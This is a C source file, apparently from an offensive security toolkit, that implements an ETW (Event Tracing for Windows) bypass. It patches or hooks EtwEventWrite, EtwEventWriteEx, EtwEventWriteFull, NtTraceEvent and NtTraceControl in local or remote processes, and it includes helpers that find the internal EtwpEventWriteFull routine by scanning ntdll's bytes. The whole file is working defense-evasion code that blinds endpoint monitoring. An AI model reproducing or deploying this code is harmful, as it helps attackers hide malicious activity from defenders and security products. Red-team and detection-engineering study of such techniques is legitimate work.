#include "etw_bypass.h"

BOOL applyEtwBypass(HANDLE hProcess) {
    if (hProcess == NULL)
        hProcess = NtCurrentProcess();

    DebugPrint("\n<========     ETW Bypass [PID - %d]     ========>\n", GetProcessId(hProcess));
#if defined(JMP_RET_BASED_ETW_PATCH)
    /*if (!JmpRetBasedEtwPatch(hProcess, "EtwpEventWriteFull")) {
        DebugPrint("[!] JmpRetBasedEtwPatch on EtwpEventWriteFull failed\n");
		DebugPrint("<=====================================>\n\n");
        return FALSE;
    }*/
    if (!JmpRetBasedEtwPatch(hProcess, "EtwEventWrite")) {
        DebugPrint("[!] JmpRetBasedEtwPatch on EtwEventWrite failed\n");
		DebugPrint("<=====================================>\n\n");
        return FALSE;
    }
    if (!JmpRetBasedEtwPatch(hProcess, "EtwEventWriteEx")) {
        DebugPrint("[!] JmpRetBasedEtwPatch on EtwEventWriteEx failed\n");
        DebugPrint("<=====================================>\n\n");
        return FALSE;
    }
    if (!JmpRetBasedEtwPatch(hProcess, "EtwEventWriteFull")) {
        DebugPrint("[!] JmpRetBasedEtwPatch on EtwEventWrite failed\n");
        DebugPrint("<=====================================>\n\n");
        return FALSE;
    }
#elif defined(CALL_BASED_ETW_PATCH)
    if (!CallBasedEtwPatch(hProcess, "EtwEventWrite")) {
        DebugPrint("[!] CallBasedEtwPatch on EtwEventWrite failed\n");
        DebugPrint("<=====================================>\n\n");
        return FALSE;
    }
    if (!CallBasedEtwPatch(hProcess, "EtwEventWriteEx")) {
        DebugPrint("[!] CallBasedEtwPatch on EtwEventWriteEx failed\n");
        DebugPrint("<=====================================>\n\n");
        return FALSE;
    }
    if (!CallBasedEtwPatch(hProcess, "EtwEventWriteFull")) {
        DebugPrint("[!] CallBasedEtwPatch on EtwEventWriteFull failed\n");
        DebugPrint("<=====================================>\n\n");
        return FALSE;
    }
#elif defined(SYSCALL_BASED_ETW_PATCH)
    if (!SyscallPatchEtw(hProcess, "NtTraceEvent")) {
        DebugPrint("[!] SyscallPatchEtw on NtTraceEvent failed\n");
        DebugPrint("<=====================================>\n\n");
        return FALSE;
    }
    if (!SyscallPatchEtw(hProcess, "NtTraceControl")) {
        DebugPrint("[!] SyscallPatchEtw on NtTraceControl failed\n");
        DebugPrint("<=====================================>\n\n");
        return FALSE;
    }
#elif defined(HBP_ETW_HOOKING)
    if (!HbpEtwHooking(hProcess, "EtwpEventWriteFull")) {
        DebugPrint("[!] HbpEtwHooking on EtwpEventWriteFull failed\n");
        DebugPrint("<=====================================>\n\n");
        return FALSE;
    }
    /*if (!HbpEtwHooking(hProcess, "EtwEventWrite")) {
        DebugPrint("[!] HbpEtwHooking on EtwEventWrite failed\n");
        DebugPrint("<=====================================>\n\n");
        return FALSE;
    }
    if (!HbpEtwHooking(hProcess, "EtwEventWriteEx")) {
        DebugPrint("[!] HbpEtwHooking on EtwEventWriteEx failed\n");
        DebugPrint("<=====================================>\n\n");
        return FALSE;
    }
    if (!HbpEtwHooking(hProcess, "EtwEventWriteFull")) {
        DebugPrint("[!] HbpEtwHooking on EtwEventWriteFull failed\n");
        DebugPrint("<=====================================>\n\n");
        return FALSE;
    }*/
#else
    DebugPrint("[!] No ETW Technique selected\n");
    DebugPrint("<===================================================>\n\n");
    return TRUE;
#endif
    DebugPrint("[+] ETW Bypass applied successfully!\n");
    DebugPrint("<===================================================>\n\n");
    return TRUE;
}

// Get the address of 'EtwpEventWriteFull' in the remote process
PVOID _fetchEtwpEventWriteFullAddr(HANDLE hProcess) {
	INT     i = 0;
	PBYTE   pEtwEventFunc = NULL;
	DWORD   dwOffSet = 0x00;
	PBYTE   localBuffer = NULL;
	SIZE_T  bytesRead = 0;

	// Allocate a local buffer to read memory from the remote process
	localBuffer = (PBYTE)malloc(1024);
	if (!localBuffer) {
		DebugPrint("[!] Memory allocation failed\n");
		return NULL;
	}

	// Get the address of "EtwEventWrite" in the remote process
	pEtwEventFunc = (PBYTE)GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWrite");
	if (!pEtwEventFunc) {
		free(localBuffer);
		return NULL;
	}
	DebugPrint("[+] pEtwEventFunc : 0x%p \n", pEtwEventFunc);

	// Read memory from the remote process
	if (!ReadProcessMemory(hProcess, pEtwEventFunc, localBuffer, 1024, &bytesRead)) {
		DebugPrint("[!] ReadProcessMemory failed with error %d\n", GetLastError());
		free(localBuffer);
		return NULL;
	}

	// A while-loop to find the last 'ret' instruction
	while (i < bytesRead) {
		if (localBuffer[i] == x64_RET_INSTRUCTION_OPCODE && localBuffer[i + 1] == x64_INT3_INSTRUCTION_OPCODE)
			break;
		i++;
	}

	// Searching upwards for the 'call' instruction
	while (i) {
		if (localBuffer[i] == x64_CALL_INSTRUCTION_OPCODE) {
			pEtwEventFunc = (PBYTE)((DWORD_PTR)pEtwEventFunc + i);
			break;
		}
		i--;
	}

	// If the first opcode is not 'call', return null
	if (pEtwEventFunc != NULL && pEtwEventFunc[0] != x64_CALL_INSTRUCTION_OPCODE) {
		DebugPrint("[i] %p: %p\n", pEtwEventFunc, pEtwEventFunc[0]);
		free(localBuffer);
		return NULL;
	}

	DebugPrint("\t> \"call EtwpEventWriteFull\" : 0x%p \n", pEtwEventFunc);

	// Skipping the 'E8' byte ('call' opcode)
	pEtwEventFunc++;

	// Fetching EtwpEventWriteFull's offset
	if (!ReadProcessMemory(hProcess, pEtwEventFunc, &dwOffSet, sizeof(DWORD), &bytesRead)) {
		DebugPrint("[!] ReadProcessMemory failed with error %d\n", GetLastError());
		free(localBuffer);
		return NULL;
	}
	DebugPrint("\t> Offset : 0x%0.8X \n", dwOffSet);

	// Adding the size of the offset to reach the end of the call instruction
	pEtwEventFunc += sizeof(DWORD);

	// Adding the offset to the pointer reaching the address of 'EtwpEventWriteFull'
	pEtwEventFunc += dwOffSet;

	free(localBuffer);

	// pEtwEventFunc is now the address of EtwpEventWriteFull
	return (PVOID)pEtwEventFunc;
}

PVOID fetchEtwpEventWriteFullAddr() {
    INT i = 0;
    PBYTE pEtwEventFunc = NULL;
    DWORD dwOffSet = 0x00;
    PBYTE localBuffer = NULL;

    // Allocate a local buffer to read memory
    localBuffer = (PBYTE)malloc(1024);
    if (!localBuffer) {
        DebugPrint("[!] Memory allocation failed\n");
        return NULL;
    }

    // Get the address of "EtwEventWrite" in the current process
    pEtwEventFunc = (PBYTE)GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWrite");
    if (!pEtwEventFunc) {
        free(localBuffer);
        return NULL;
    }
    DebugPrint("[+] pEtwEventFunc : 0x%p \n", pEtwEventFunc);

    // Copy memory from the current process into the local buffer
    memcpy(localBuffer, pEtwEventFunc, 1024);

    // A while-loop to find the last 'ret' instruction
    while (i < 1024) {
        if (localBuffer[i] == x64_RET_INSTRUCTION_OPCODE && localBuffer[i + 1] == x64_INT3_INSTRUCTION_OPCODE)
            break;
        i++;
    }

    // Searching upwards for the 'call' instruction
    while (i) {
        if (localBuffer[i] == x64_CALL_INSTRUCTION_OPCODE) {
            pEtwEventFunc = (PBYTE)((DWORD_PTR)pEtwEventFunc + i);
            break;
        }
        i--;
    }

    // If the first opcode is not 'call', return null
    if (pEtwEventFunc != NULL && pEtwEventFunc[0] != x64_CALL_INSTRUCTION_OPCODE) {
        DebugPrint("[i] %p: %p\n", pEtwEventFunc, pEtwEventFunc[0]);
        free(localBuffer);
        return NULL;
    }

    DebugPrint("\t> \"call EtwpEventWriteFull\" : 0x%p \n", pEtwEventFunc);

    // Skipping the 'E8' byte ('call' opcode)
    pEtwEventFunc++;

    // Fetching EtwpEventWriteFull's offset
    memcpy(&dwOffSet, pEtwEventFunc, sizeof(DWORD));
    DebugPrint("\t> Offset : 0x%0.8X \n", dwOffSet);

    // Adding the size of the offset to reach the end of the call instruction
    pEtwEventFunc += sizeof(DWORD);

    // Adding the offset to the pointer reaching the address of 'EtwpEventWriteFull'
    pEtwEventFunc += dwOffSet;

    free(localBuffer);

    // pEtwEventFunc is now the address of EtwpEventWriteFull
    return (PVOID)pEtwEventFunc;
}
